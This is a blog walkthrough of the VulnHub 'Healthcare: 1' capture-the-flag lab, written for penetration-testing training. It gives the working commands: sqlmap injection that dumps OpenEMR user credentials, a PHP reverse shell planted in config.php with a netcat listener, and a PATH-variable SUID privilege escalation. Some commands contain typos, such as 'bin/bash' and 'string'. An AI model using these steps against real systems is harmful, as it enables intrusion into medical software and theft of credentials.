<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Healthcare: 1 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/healthcare-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-09-19T16:42:00+00:00">September 19, 2020</time><time class="updated" datetime="2025-07-10T18:45:42+00:00">July 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to solve another boot2root challenge called “HEALTHCARE 1”. It is developed to train student the art of penetration testing.  The credit of making this lab goes to <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="http://vulnhub.com/author/v1n1v131r4,715/">v1n1v131r4</a> </strong></span>and lab is available for download here <strong> <span style="color: #0000ff;"><a style="color: #0000ff;" href="http://vulnhub.com/entry/healthcare-1,522/">healthcare-1</a></span></strong>. This is an Intermediate level machine that hosts two flags: user.txt and root.txt.</span></p>
<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
<ul>
<li><span style="color: #000000;">netdiscover</span></li>
<li><span style="color: #000000;">nmap</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">Browsing HTTP Service</span></li>
<li><span style="color: #000000;">Directory Brute force using ‘ <strong>gobuster</strong> ‘</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
<ul>
<li><span style="color: #000000;">OpenEMR 4.1.0 Vulnerable to Critical SQL Injection     </span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Privilege Escalation Using PATH Variable with SUID bin</span></li>
</ul>
<h3><span style="color: #800000;">Reconnaissance</span></h3>
<p><span style="color: #000000;">Let’s begin scanning the network using “netdiscover” to identify the target IP address as shown below:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">netdiscover</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WT1Vt66dm2Y/X2YF9LWb7kI/AAAAAAAAom4/7h5Lt0jYIhIeXI5eEEVxsTFNV1GKUvZ0ACLcBGAsYHQ/s16000/1.png"/></span></p>
<p><span style="color: #000000;">The target is identified to be 192.168.0.158. So, it’s time to grab more information about the target by executing ‘nmap’ port enumeration command: </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 192.168.0.158</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gm5_DcrmeRw/X2YHCCeBwrI/AAAAAAAAonE/gpEwzW0HIT0fxlCCYF6zFtJCDLMXPbQQgCLcBGAsYHQ/s16000/2.png"/></span></p>
<h3><span style="color: #800000;">Enumeration</span></h3>
<p><span style="color: #000000;">The initial scan shows that we have port 21(FTP) and  80(HTTP) open. The web server usually has the largest attack surface, so first, let’s explore the webserver running on port 80. </span><span style="color: #000000;">However, we do not get any clue as we explore in and around the page (including its sub-links and source code view)     </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UNza_Z1Vygc/X2YHMgWOsMI/AAAAAAAAonI/7G72ZYVWru0y0yj9pOoihnHvRLQGFAoiQCLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">To further enumerate, let’s launch ‘gobuster ‘ -the directory enumeration tool to look for other web directories or hidden content which this web application may have.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">gobuster dir -u http://192.168.0.158/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 –e</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-a6F92I2eblw/X2YHViCA1DI/AAAAAAAAonQ/wVcXIdp0-PofyLU15_9Os5xx1O9XbqS2QCLcBGAsYHQ/s16000/4.png"/></span></p>
<p><span style="color: #000000;">The tool “gobuster” presents us with some directories like favicon, robots,  openemr, fonts, images etc. The “<strong>openemr</strong>” directory seems to contain a login page and revels the OpenEMR software &amp; its installed version i.e. OpenEMR v4.1.0. </span><span style="color: #000000;">A quick google search lets us know about a critical SQL injection exploit here: <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.netsparker.com/web-applications-advisories/sql-injection-vulnerability-in-openemr/">sql-injection-vulnerability-in-openemr</a> </strong></span></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8Tuwhp9cJi8/X2YHcGf0Y-I/AAAAAAAAonU/lXaPHA3fSuwHEZpi_hv9Z0dSQd-IivsZACLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">Let’s use ‘sqlmap’  to further enumerate the database names with the following command :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -u http://192.168.0.158/openemr/interface/login/validateUser.php?u= --dbs --batch</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KJXmfyw-wts/X2YHnVMxyAI/AAAAAAAAong/zWzzVuLdh0wzk9fsgwQnEs2PyVZ03w4dACLcBGAsYHQ/s16000/7.png"/></span></p>
<p><span style="color: #000000;">….and we get the list of database names as below: </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-u2fZqvC9hfg/X2YH4iI8SyI/AAAAAAAAons/AfHErHSQANU8ORXwdcEns383zpkLiifQQCLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">The database named ‘<strong>openemr</strong>‘ looks associated with the web-application we are exploring and hence we further enumerate the database :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -u http://192.168.0.158/openemr/interface/login/validateUser.php?u= -D openemr -T users --dump --batch</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-InJCMuLAZOc/X2YIAhI4IpI/AAAAAAAAonw/0fM7jbJbQqsRAIV6o1ZzlkdjT5QeHDlbQCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">We get two users and their respective passwords as shown here:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ri7sEHelwW0/X2YIH_RkTPI/AAAAAAAAon0/1PktJ00bDr4ltpFIIDe-D1808Wef8hG0ACLcBGAsYHQ/s16000/10.png"/></span></p>
<h3><span style="color: #800000;">Exploitation</span></h3>
<p><span style="color: #000000;">Now, let’s navigate to ‘openemr ‘  web application login page and use  ‘<strong>ackbar</strong>‘  credentials to login as <strong>admin</strong> : </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sjJUVjpQUVg/X2YIP2e51zI/AAAAAAAAon4/XFUfcGfD4gAf-TblLOkloMMXsDhPrhDagCLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">As we explore the application, we find that we can edit the config.php which is under the ‘Administrative’ tab shown below: </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Djr3hlv5_Cs/X2YIYhPg8EI/AAAAAAAAooE/g_H4fYHfnIMWiM1z7QU9V2iVECe_LAGDQCLcBGAsYHQ/s16000/12.png"/></span></p>
<p><span style="color: #000000;">We overwrite the content of config.php with PHP reverse shell <span style="color: #0000ff;"><strong> <a style="color: #0000ff;" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php-reverse-shell.php</a></strong></span>  and replace the IP with our Kali Linux IP as highlighted below  :</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XOKVB8M89zI/X2YIh_qy4fI/AAAAAAAAooM/K3nAal7c8iQoty7mZ1IMneoCHPr6oUb_ACLcBGAsYHQ/s16000/13.png"/></span></p>
<p><span style="color: #000000;">Save the above changes, start a netcat listener on kali; we get a reverse shell on after reloading the web page :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234</pre>
<p><span style="color: #000000;">Now, that we have a revere shell lets upgrade it to a fully interactive TTY shell with the help of python-onliner and further go for post enumeration in order to escalate root privileges. So first we log in as <strong>medical:medica</strong>l (enumerated through SQLi) and then try to identify SUID enables binaries using the find command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -c 'import pty; pty.spawn("/bin/bash")'
su medical
find / -perm -u=s -type f 2&gt;/dev/null</pre>
<p>We found SUID bit enabled for /usr/bin/healthcheck</p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pwbZdLZceZs/X2YJ0GVy4xI/AAAAAAAAoog/00PtnbXhER8LOXwkbg7QC2Zy2jT2FzQLgCLcBGAsYHQ/s16000/15.png"/></span></p>
<p><span style="color: #000000;">We explore ‘healthcheck’ further using strings command and we find that it scans the system by running commands like ‘ ifconfig ‘  and  ‘ fdisk ‘  :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">string /usr/bin/healthcheck</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jdr-vVIqvM8/X2YJ_Ii7TLI/AAAAAAAAook/Ci744sRFK6Y6pJocSlwWjaZqo6qkM-C_gCLcBGAsYHQ/s16000/16.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation</span></h3>
<p><span style="color: #000000;">We can use the Privilege Escalation Technique Using PATH Variable to exploit the system, read from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">here</a> </strong></span>to know more about this :</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
echo "bin/bash" &gt; fdisk
chmod 777 fdisk
export PATH=/tmp:$PATH
/usr/bin/healthcheck
cd /root
ls</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3A40NE0Sd8w/X2YKMjG5wZI/AAAAAAAAoos/Pz2QoRxVpcgAWNM1-fSSLvo2gWxzPApBQCLcBGAsYHQ/s16000/20.png"/></span></p>
<p><span style="color: #000000;">….and we have the root flag: cat root.txt</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TF9g7mp0fJE/X2YKT_VJTGI/AAAAAAAAoo0/lHpJBpkQN-sqEmlnQypBRPP8-nl9vGN-QCLcBGAsYHQ/s16000/21.png"/></span></p>
<p><span style="color: #000000;">Cheers!! – We nailed it, hope you enjoyed it. – Happy hacking!</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Shrawan Kumar is an embedded systems security engineer with a decade of experience building embedded and IoT products. He can be contacted <a href="https://www.linkedin.com/in/shrawan-kumar-2185b523/"><strong>here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
